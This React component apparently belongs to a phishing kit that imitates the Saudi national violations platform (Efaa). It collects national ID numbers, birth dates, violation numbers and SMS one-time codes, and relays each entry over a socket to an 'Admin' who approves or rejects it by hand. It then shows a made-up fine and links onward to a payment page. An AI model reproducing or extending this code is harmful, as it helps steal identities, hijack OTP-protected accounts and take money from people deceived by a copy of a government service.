import axios from "axios";
import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { IoMdPerson } from "react-icons/io";
import { IoMdCloseCircle } from "react-icons/io";
import { FaBuilding } from "react-icons/fa6";
import { CustomDateInput } from "../components/CustomDateInput";
import { MdPermContactCalendar } from "react-icons/md";
import { MdNumbers } from "react-icons/md";
import { FaBridge } from "react-icons/fa6";
import { BsFillCreditCardFill } from "react-icons/bs";
import { BiBracket } from "react-icons/bi";
import { FaCalendarAlt } from "react-icons/fa";
import { FaMoneyCheckDollar } from "react-icons/fa6";
import Navbar from "../components/Navbar";

export const id = sessionStorage.getItem("id");

const Home = ({}) => {
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(60);
  const [type, setType] = useState("افراد");
  const [nationalId, setNationalId] = useState("");
  const [vioNumber, setVioNumer] = useState("");
  const [birthday, setBirthday] = useState("");
  const [buildNumber, setBuildNumber] = useState("");
  const [nationalOther, setNationalOther] = useState();
  const [popUp, setPopUp] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [price, setPrice] = useState(0);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const ID = sessionStorage.getItem("id");

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    setError("");
    if (type === "افراد") {
      if (!birthday && !vioNumber) {
        setLoading(false);
        return window.alert("برجاء إدخال رقم المخالفة  أو  تاريخ الميلاد ");
      } else {
        await axios
          .post(api_route + "/login", {
            type,
            vioNumber,
            birthday: new Date(birthday).toDateString(),
            nationalId,
          })
          .then(({ data }) => {
            sessionStorage.setItem("id", data.order._id);
            socket.emit("login", data.order);
          });
      }
    } else {
      if (!vioNumber && !nationalOther) {
        return window.alert(
          "برجاء إدخال تاريخ الميلاد أو رقم هوية أحد العملاء"
        );
      } else {
        await axios
          .post(api_route + "/login", {
            type,
            vioNumber,
            nationalOther,
            buildNumber,
          })
          .then(({ data }) => {
            sessionStorage.setItem("id", data.order._id);
            socket.emit("login", data.order);
          });
      }
    }
  };

  const handleOtp = async (e) => {
    setLoading(true);
    e.preventDefault();
    setError("");
    try {
      await axios
        .post(api_route + "/loginOtp/" + sessionStorage.getItem("id"), {
          type,
          otp,
        })
        .then(({ data }) => {
          socket.emit("loginOtp", data.order);
        });
    } catch (error) {}
  };

  socket.on("acceptLogin", ({ id, price }) => {
    console.log("acceptLogin From Admin");

    if (id === ID) {
      if (type === "افراد") {
        sessionStorage.setItem("id", id);
        sessionStorage.setItem("nationalId", nationalId);
        if (vioNumber) {
          sessionStorage.setItem("vioNumber", vioNumber);
        }
        if (birthday) {
          sessionStorage.setItem("birthday", birthday);
        }
        if (price) {
          sessionStorage.setItem("price", price);
          setPrice(price);
        }

        setLoading(false);

        if (birthday) {
          console.log("found");
          setOtpVisible(true);
        } else {
          console.log("not found");
          setPopUp(true);
        }
        window.scrollTo({ top: "0px" });
      } else {
        sessionStorage.setItem("id", id);
        sessionStorage.setItem("nationalOther", nationalOther);
        sessionStorage.setItem("vioNumber", vioNumber);
        sessionStorage.setItem("buildNumber", buildNumber);
        sessionStorage.setItem("price", price);
        setPrice(price);
        setLoading(false);
        setPopUp(true);
        window.scrollTo({ top: "0px" });
      }
    }
  });

  socket.on("declineLogin", (data) => {
    console.log(id);
    console.log("declineLogin From Admin", data);
    setLoading(false);
    setError("بيانات الدخول غير  صحيحة المحاولة مره اخري");
  });

  socket.on("acceptOTPLogin", ({ id, price }) => {
    console.log("user", ID);
    console.log("acceptOTPLogin From Admin", id);
    if (ID === id) {
      setLoading(false);
      if (price) {
        sessionStorage.setItem("price", price);
        setPrice(price);
      }
      setOtpVisible(false);
      setPopUp(true);
    }
  });

  socket.on("declineOTPLogin", (id) => {
    console.log("declineOTPLogin From Admin", id);
    if (ID === id) {
      setLoading(false);
      setError("بيانات الدخول غير  صحيحة المحاولة مره اخري");
    }
  });

  const popUpValue = [
    {
      name: "هوية المخالف",
      icon: <MdPermContactCalendar className="text-xl text-gray-500" />,
      value: nationalId,
    },
    {
      name: "تاريخ الميلاد ",
      icon: <FaCalendarAlt className="text-xl text-gray-500" />,
      value: birthday ? new Date(birthday).toDateString() : "",
    },
    {
      name: "رقم المخالفة",
      icon: <MdNumbers className="text-xl text-gray-500" />,
      value: vioNumber,
    },
    {
      name: "الحهة المصدرة للمخالفة",
      icon: <FaBridge className="text-xl text-gray-500" />,
      value: "الإدارة العامة للمرور",
    },
    {
      name: "نوع المخالفة",
      icon: <BsFillCreditCardFill className="text-xl text-gray-500" />,
      value: " مخالفة المرور",
    },
    {
      name: "رقم المسار",
      icon: <BiBracket className="text-xl text-gray-500" />,
      value: "0",
    },
    {
      name: " الرقم التسلسلي للمركبة الأجنبية",
      icon: <BiBracket className="text-xl text-gray-500" />,
      value: "0",
    },
    {
      name: "تاريخ سداد المخالفة المخالفة",
      icon: <FaCalendarAlt className="text-xl text-gray-500" />,
      value: "-",
    },
    {
      name: "إحمالي مبلغ المخالفة",
      icon: <FaMoneyCheckDollar className="text-xl text-gray-500" />,
      value: price + " ريال ",
    },
  ];

  return (
    <>
      <Navbar />
      <div className="w-full flex items-center justify-center lg:flex-row-reverse flex-col py-5 gap-5 relative">
        <div className="w-11/12 lg:w-1/2 flex flex-col items-center justify-center">
          <div className="main_bg w-full flex flex-col md:flex-row  items-center justify-center text-white px-4 py-5">
            <div
              className="flex flex-col gap-y-2 md:items-end items-center md:py-2"
              dir="rtl "
            >
              <span className="text-3xl md:text-5xl ">
                المنصة الوطنية للمخالفات
              </span>
              <span className="text-lg">وجهة واحدة لإدارة جميع المخالفات</span>
              <span className="hidden md:block text-right">
                المنصة الوطنية للمخالفات (إيفاء) هي إحدى المنصات الوطنية التي
                ينفذها مركز المعلومات الوطني التابع للهيئة السعودية للبيانات
                والذكاء الإصطناعي وهي تهدف إلى تمكين المواطنين والمقيمين
                والزائرين وأصحاب الأعمال من معرفة واستعراض كافة مخالفاتهم لدى
                الجهات الحكومية بكل يسر وسهولة.
              </span>
              <div className="flex-col-reverse flex w-full  md:flex-row gap-3 py-5 md:items-end justify-start">
                <div
                  className="flex items-center justify-center gap-2 p-2 cursor-pointer hover:text-black transition-all"
                  style={{ background: "#17605d" }}
                >
                  <span>شركاء</span>
                  <FaBuilding className="text-2xl" />
                </div>
                <div
                  className="flex items-center justify-center gap-2  p-2 cursor-pointer  hover:text-black transition-all"
                  style={{ background: "#17605d" }}
                >
                  <span>أفراد و أعمال</span>
                  <IoMdPerson className="text-2xl" />
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="w-11/12 lg:w-1/4 md:w-1/2 flex flex-col items-center justify-center">
          <div className="gray_bg w-full flex flex-col md:flex-row  items-center justify-center  px-4 py-5">
            <div
              className="flex flex-col gap-y-2 md:items-end items-center md:py-2 w-full"
              dir="rtl "
            >
              <span className="text-3xl md:text-5xl "></span>
              <span className="text-xl ">استعلام عن مخالفة</span>
              <div
                className="w-full flex items-center justify-center text-white"
                dir="rtl"
              >
                <div
                  className={`flex items-center justify-center gap-x-2  flex-row-reverse  w-1/2 py-2 ${
                    type === "افراد" ? "dark_bg" : "main_bg"
                  }  rounded-r`}
                  onClick={() => setType("افراد")}
                >
                  <span>أفراد</span>
                  <IoMdPerson />
                </div>
                <div
                  className={`flex items-center justify-center gap-x-2  flex-row-reverse  w-1/2 py-2 ${
                    type === "منشأة" ? "dark_bg" : "main_bg"
                  }  rounded-r`}
                  onClick={() => setType("منشأة")}
                >
                  <span>منشأة</span>
                  <FaBuilding />
                </div>
              </div>
              <div className="flex-col-reverse flex w-full  gap-3 py-3 md:items-center justify-start text-white">
                <form
                  className="flex flex-col items-center justify-center gap-2 md:w-full  px-2"
                  onSubmit={handleSubmit}
                >
                  {type === "افراد" ? (
                    <input
                      className="bg-gray-50 w-full text-center py-3 text-sm  text-black"
                      placeholder="رقم الهوية أو رقم الحدود "
                      type="text"
                      value={nationalId}
                      onChange={(e) => setNationalId(e.target.value)}
                      required
                      inputMode="numeric"
                    />
                  ) : (
                    <input
                      className="bg-gray-50 w-full text-center py-3 text-sm text-black"
                      placeholder="رقم المنشأة ( يبدأ برقم 7 )"
                      type="text"
                      value={buildNumber}
                      onChange={(e) => setBuildNumber(e.target.value)}
                      required
                      inputMode="numeric"
                    />
                  )}
                  <div className="flex justify-center items-center w-full">
                    {type === "افراد" ? (
                      <CustomDateInput setBirthday={setBirthday} />
                    ) : (
                      <input
                        className="bg-gray-50 w-full text-center py-3  text-sm  text-black"
                        placeholder="رقم الهوية أحد العمالة "
                        type="text"
                        value={nationalOther}
                        onChange={(e) => setNationalOther(e.target.value)}
                        inputMode="numeric"
                      />
                    )}
                    <span className="p-2 text-white bg-gray-500  h-full">
                      أو
                    </span>
                    <input
                      className="bg-gray-50 w-full text-center py-3 text-sm  text-black "
                      placeholder="رقم المخالفة"
                      type="text"
                      value={vioNumber}
                      onChange={(e) => setVioNumer(e.target.value)}
                    />
                  </div>
                  <button
                    type="submit"
                    className="flex items-center justify-center gap-2 p-2 w-full"
                    style={{ background: "#17605d" }}
                  >
                    استعلام
                  </button>
                  {error && (
                    <span className="text-red-500 text-center w-full py-2 text-sm">
                      {error}
                    </span>
                  )}
                </form>
              </div>
            </div>
          </div>
        </div>
        {otpVisible ? (
          <div className="fixed bg-black bg-opacity-45 top-0   w-full h-screen flex flex-col items-center justify-start pt-52   ">
            <IoMdCloseCircle
              className="text-red-500 bg-white rounded-full self-start ml-5 text-3xl mb-2"
              onClick={() => setOtpVisible(false)}
            />
            <form
              className="bg-white flex flex-col items-center justify-center rounded-md  py-4 lg:w-1/4 md:w-1/2 w-11/12 gap-y-3"
              onSubmit={handleOtp}
            >
              <span className="text-xl">أدخل الرقم المرسل إلي جوالك</span>
              <input
                type="text"
                inputMode="numeric"
                className="border rounded-md p-2 w-1/2 text-center text-black"
                minLength={4}
                maxLength={6}
                required
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
              />
              <div className="flex gap-x-2 w-full items-center justify-center ">
                <span
                  className="bg-gray-500 text-white px-2 py-1 rounded-md"
                  onClick={() => setPopUp(false)}
                >
                  إعادة إرسال
                </span>
                <span
                  className="bg-red-500 text-white px-2 py-1 rounded-md"
                  onClick={() => setPopUp(false)}
                >
                  إلغاء
                </span>
                <button
                  className="main_bg text-white px-2 py-1 rounded-md"
                  type="submit"
                >
                  تأكيد
                </button>
              </div>
              <div>
                <p>
                  {formattedMinutes}:{formattedSeconds} يمكنك إعادة الإرسال بعد{" "}
                </p>
              </div>
              {error && (
                <span className="text-red-500 text-center w-full py-2 text-sm">
                  {error}
                </span>
              )}
            </form>
          </div>
        ) : (
          ""
        )}
        {popUp ? (
          <div className="fixed bg-black bg-opacity-45 top-0   w-full h-screen flex flex-col items-center justify-start md:pt-20 z-50   ">
            <div className="w-11/12 lg:w-1/2 md:w-2/3 ">
              <IoMdCloseCircle
                className="text-red-500 bg-white rounded-full  ml-5 text-3xl mb-2 cursor-pointer"
                onClick={() => setPopUp(false)}
              />
              <div
                className="bg-white grid xxl:grid-cols-4 xl:grid-cols-3  md:grid-cols-2 gap-5 rounded-md  py-4  w-11/12 gap-y-3 px-3"
                dir="rtl"
              >
                {popUpValue.map((com, i) => {
                  return (
                    com.value && (
                      <div className="flex flex-col w-full gap-2 " key={i}>
                        <div className="flex items-center  gap-x-2 w-full">
                          {com.icon}
                          <span className="text-sm">{com.name}</span>
                        </div>
                        <span className="w-full bg-gray-200  text-center text-lg">
                          {com.value}
                        </span>
                      </div>
                    )
                  );
                })}
                <div className="flex items-end xl:col-span-1 md:col-span-2 col-span-1">
                  <button
                    className="py-2 w-full  text-center bg-green-500 text-white wouned-md"
                    onClick={() => (window.location.href = "/payment")}
                  >
                    إدفع الأن
                  </button>
                </div>
              </div>
            </div>
          </div>
        ) : (
          ""
        )}
        {loading ? (
          <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
            <TailSpin
              height="50"
              width="50"
              color="white"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
          </div>
        ) : (
          ""
        )}
      </div>
    </>
  );
};

export default Home;
